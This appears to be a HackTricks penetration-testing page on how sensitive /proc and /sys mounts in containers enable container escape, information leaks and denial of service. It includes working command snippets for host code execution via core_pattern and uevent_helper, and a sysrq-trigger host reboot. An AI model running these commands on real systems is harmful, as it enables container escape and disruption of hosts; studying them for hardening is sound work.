

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.

**You can find further details of each potential vuln in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**

# procfs Vulnerabilities

## `/proc/sys`
This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:

### **`/proc/sys/kernel/core_pattern`**  
   - Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
   - Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
   - **Testing and Exploitation Example**:
     ```bash
     [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
     cd /proc/sys/kernel
     echo "|$overlay/shell.sh" > core_pattern # Set custom handler
     sleep 5 && ./crash & # Trigger handler
     ```

### **`/proc/sys/kernel/modprobe`**
   - Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
   - Contains the path to the kernel module loader, invoked for loading kernel modules.
   - **Checking Access Example**:
     ```bash
     ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
     ```

### **`/proc/sys/vm/panic_on_oom`**
   - Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
   - A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.

### **`/proc/sys/fs`**
   - As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
   - Write access can enable various denial-of-service attacks against the host.

### **`/proc/sys/fs/binfmt_misc`**
   - Allows registering interpreters for non-native binary formats based on their magic number.
   - Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
   - Relevant exploit and explanation:
     - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
     - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## Others in `/proc`

### **`/proc/config.gz`**
   - May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
   - Useful for attackers to identify vulnerabilities in the running kernel.

### **`/proc/sysrq-trigger`**
   - Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
   - **Rebooting Host Example**:
     ```bash
     echo b > /proc/sysrq-trigger # Reboots the host
     ```

### **`/proc/kmsg`**
   - Exposes kernel ring buffer messages.
   - Can aid in kernel exploits, address leaks, and provide sensitive system information.

### **`/proc/kallsyms`**
   - Lists kernel exported symbols and their addresses.
   - Essential for kernel exploit development, especially for overcoming KASLR.
   - Address information is restricted with `kptr_restrict` set to `1` or `2`.
   - Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/[pid]/mem`**
   - Interfaces with the kernel memory device `/dev/mem`.
   - Historically vulnerable to privilege escalation attacks.
   - More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/kcore`**
   - Represents the system's physical memory in ELF core format.
   - Reading can leak host system and other containers' memory contents.
   - Large file size can lead to reading issues or software crashes.
   - Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

### **`/proc/kmem`**
   - Alternate interface for `/dev/kmem`, representing kernel virtual memory.
   - Allows reading and writing, hence direct modification of kernel memory.

### **`/proc/mem`**
   - Alternate interface for `/dev/mem`, representing physical memory.
   - Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.

### **`/proc/sched_debug`**
   - Returns process scheduling information, bypassing PID namespace protections.
   - Exposes process names, IDs, and cgroup identifiers.

### **`/proc/[pid]/mountinfo`**
   - Provides information about mount points in the process's mount namespace.
   - Exposes the location of the container `rootfs` or image.

## `/sys` Vulnerabilities

### **`/sys/kernel/uevent_helper`**
   - Used for handling kernel device `uevents`.
   - Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
   - **Example for Exploitation**:
     %%%bash
     # Creates a payload
     echo "#!/bin/sh" > /evil-helper
     echo "ps > /output" >> /evil-helper
     chmod +x /evil-helper
     # Finds host path from OverlayFS mount for container
     host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
     # Sets uevent_helper to malicious helper
     echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
     # Triggers a uevent
     echo change > /sys/class/mem/null/uevent
     # Reads the output
     cat /output
     %%%

### **`/sys/class/thermal`**
   - Controls temperature settings, potentially causing DoS attacks or physical damage.

### **`/sys/kernel/vmcoreinfo`**
   - Leaks kernel addresses, potentially compromising KASLR.

### **`/sys/kernel/security`**
   - Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
   - Access might enable a container to disable its MAC system.

### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
   - Exposes interfaces for interacting with EFI variables in NVRAM.
   - Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

### **`/sys/kernel/debug`**
   - `debugfs` offers a "no rules" debugging interface to the kernel.
   - History of security issues due to its unrestricted nature.


## References
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


